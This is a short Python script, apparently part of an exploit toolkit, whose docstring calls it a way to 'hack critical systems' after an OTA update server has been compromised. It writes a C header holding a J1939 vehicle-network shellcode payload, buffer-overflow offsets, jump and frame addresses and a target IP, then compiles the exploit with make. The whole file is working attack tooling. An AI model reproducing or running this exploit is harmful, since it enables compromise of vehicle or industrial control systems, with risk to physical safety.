#!/usr/bin/python3
"""
Hack critical systems

Assumes the OTA server has been already hacked
"""
import os

# Define some constants first

PORT = 5002
PGN = 60879
TARGET_ADDR = "10.88.88.12"
J1939_PAYLOAD = [0x37,0x1e,0xc,0x0,0x1b,0xe,0x7e,0x98,0x13,0x1e,0xce,0x0,0x13,0xe,0xe,0xf7,0x93,0xe,0x10,0x0,0x23,0x0,0xde,0x1,0x37,0x1e,0xc,0x0,0x1b,0xe,0x7e,0x98,0x13,0x1e,0xce,0x0,0x13,0xe,0x2e,0xf8,0x93,0xe,0x10,0x0,0x23,0x0,0xde,0x1,0xb7,0x0,0xc,0x0,0x9b,0x80,0x70,0x1,0x93,0x90,0xc0,0x0,0x93,0x80,0x40,0xdc,0x67,0x80,0x0,0x0]

JUMP_ADDR = 0xc0986f00
FRAME_ADDR = 0xc0229f50

OVERFLOW_PACKET_FRAME_IDX = 72 # 64+8
OVERFLOW_PACKET_ADDR_IDX = 80 # 64+16
OVERFLOW_PACKET_SIZE = 88 # 64+16+8

j1939_hack_dir = "j1939hack"
j1939_header = "main.h"

def hack_generate_header():
    """
    Generate main.h
    """
    print(">>> Generating hack header.")
    j1939_header_path = os.path.join(j1939_hack_dir, j1939_header)
    payload = "{" + ''.join([hex(c) + "," for c in  J1939_PAYLOAD]) + "}"

    content = [
        "/* This file is autogenerated, do not edit */"
        f"#define PORT {PORT}\n",
        f"#define PGN {PGN}\n",
        f"#define TARGET_ADDR \"{TARGET_ADDR}\"\n",
        f"#define J1939_PAYLOAD {payload}\n",
        f"#define OVERFLOW_PACKET_FRAME_IDX {OVERFLOW_PACKET_FRAME_IDX}\n",
        f"#define OVERFLOW_PACKET_ADDR_IDX {OVERFLOW_PACKET_ADDR_IDX}\n",
        f"#define OVERFLOW_PACKET_SIZE {OVERFLOW_PACKET_SIZE}\n",
        f"#define JUMP_ADDR {hex(JUMP_ADDR)}\n",
        f"#define FRAME_ADDR {hex(FRAME_ADDR)}\n",
        ]

    with open(j1939_header_path, "w") as f: 
        # Writing data to a file 
        f.writelines(content)

def hack_compile():
    print(">>> Compiling hack")
    cmd = f"cd {j1939_hack_dir}; make clean; make; cd .."
    os.system(cmd)

hack_generate_header()
hack_compile()
print("Done!")